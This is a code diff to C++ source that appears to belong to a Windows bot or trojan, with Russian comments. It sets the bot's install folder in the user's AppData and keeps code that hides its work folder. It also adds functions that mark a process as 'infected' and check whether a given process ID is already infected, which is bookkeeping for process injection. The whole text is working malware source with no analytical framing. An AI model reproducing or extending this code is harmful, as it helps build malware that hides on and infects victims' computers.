@@ -2,6 +2,7 @@
 #include <windows.h>
 #include <shlobj.h>
 
+#include "GetApi.h"
 #include "BotCore.h"
 #include "BotUtils.h"
 #include "StrConsts.h"
@@ -306,19 +307,8 @@ void DisableShowFatalErrorDialog()
 //----------------------------------------------
 string BOT::MakeBotPath()
 {
-	int CSIDL =  CSIDL_COMMON_APPDATA;
-	// Временный патч. В Висте и старше получаем папку текущего юзера
-	#ifdef USE_CURRENT_USER
-		OSVERSIONINFOEXA OSVersion;
-		OSVersion.dwOSVersionInfoSize = sizeof( OSVERSIONINFOEXA );
-		if (pGetVersionExA(&OSVersion))
-		{
-			if (OSVersion.dwMajorVersion >= 6)
-				CSIDL =  CSIDL_APPDATA;
-		}
-	#endif
 	// Создаём путь
-	return GetSpecialFolderPathA(CSIDL, NULL);
+	return GetSpecialFolderPathA(CSIDL_APPDATA, NULL);
 }
 
 //----------------------------------------------
@@ -372,4 +362,46 @@ PCHAR BOT::MakeWorkFolder()
 	BOT::AddHiddenFile(STRA::Hash(BOT_WORK_FOLDER_NAME));
 
 	return BOT_WORK_FOLDER_NAME;
+}
+
+
+
+//----------------------------------------------
+//  CreateInfectedProcessHandle
+//  Функция создаёт объяект информирования
+//  об инфицировании процесса
+//----------------------------------------------
+HANDLE CreateInfectedProcessHandle(DWORD PID)
+{
+	if (!PID) PID = Bot->PID();
+	string Prefix;
+	Prefix.LongToStr(PID);
+	Prefix += "PI";
+	return TryCreateSingleInstance(Prefix.t_str());
+}
+
+//----------------------------------------------
+// MarkAsInfcted
+// Функция омечает текущий поцесс как
+// инфицированный
+//----------------------------------------------
+void BOT::MarkAsInfcted()
+{
+	CreateInfectedProcessHandle(0);
+}
+
+//----------------------------------------------
+//  ProcessInfected
+//
+//  Функция возвращает истину если процесс с
+//  указанными пидом инфицирован
+//----------------------------------------------
+bool BOT::ProcessInfected(DWORD PID)
+{
+	// Не уевой объект будет означать, что был создан
+    // первый экземпляр
+	HANDLE Handle = CreateInfectedProcessHandle(PID);
+	bool Result = Handle == NULL;
+	pCloseHandle(Handle);
+	return Result;
 }
